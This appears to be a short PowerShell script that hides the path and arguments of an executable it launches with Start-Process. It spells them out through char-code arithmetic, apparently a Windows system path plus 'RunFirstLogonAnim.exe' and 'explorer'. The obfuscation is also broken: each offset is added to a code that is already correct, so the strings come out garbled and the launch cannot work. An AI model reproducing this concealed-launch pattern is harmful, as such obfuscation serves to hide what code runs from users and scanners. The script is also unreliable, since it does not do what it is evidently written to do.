function A1 {
    $a = [char](67 + 1)
    $b = [char](58 + 1)
    $c = [char](92 + 1)
    $d = [char](87 + 1)
    $e = [char](105 + 1)
    $f = [char](110 + 1)
    $g = [char](100 + 1)
    $h = [char](111 + 1)
    $i = [char](119 + 1)
    $j = [char](115 + 1)
    $k = [char](92 + 1)
    $l = [char](83 + 1)
    $m = [char](121 + 1)
    $n = [char](115 + 1)
    $o = [char](116 + 1)
    $p = [char](101 + 1)
    $q = [char](109 + 1)
    $r = [char](98 + 1)
    $s = [char](111 + 1)
    $t = [char](108 + 1)
    $u = [char](100 + 1)
    $v = [char](92 + 1)
    $w = [char](83 + 1)
    $x = [char](121 + 1)
    $y = [char](115 + 1)
    $z = [char](116 + 1)
    $aa = [char](101 + 1)
    $ab = [char](109 + 1)
    $ac = [char](92 + 1)
    $ad = [char](111 + 1)
    $ae = [char](111 + 1)
    $af = [char](98 + 1)
    $ag = [char](101 + 1)

    return $a + $b + $c + $d + $e + $f + $g + $h + $i + $j + $k + $l + $m + $n + $o + $p + $q + $r + $s + $t + $u + $v + $w + $x + $y + $z + $aa + $ab + $ac + $ad + $ae + $af + $ag
}

function A2 {
    $arg1 = [char](82 + 2) + [char](117 + 2) + [char](110 + 2) + [char](70 + 2) + [char](105 + 2) + [char](114 + 2) + [char](115 + 2) + [char](116 + 2) + [char](76 + 2) + [char](111 + 2) + [char](103 + 2) + [char](111 + 2) + [char](110 + 2) + [char](65 + 2) + [char](110 + 2) + [char](105 + 2) + [char](109 + 2) + [char](46 + 2) + [char](101 + 2) + [char](120 + 2) + [char](101 + 2)
    $arg2 = [char](101 + 2) + [char](120 + 2) + [char](112 + 2) + [char](108 + 2) + [char](111 + 2) + [char](114 + 2) + [char](101 + 2) + [char](114 + 2)

    return @($arg1, $arg2)
}

function Run-It {
    $exePath = A1
    $args = A2
    Start-Process $exePath -ArgumentList $args
}

Run-It
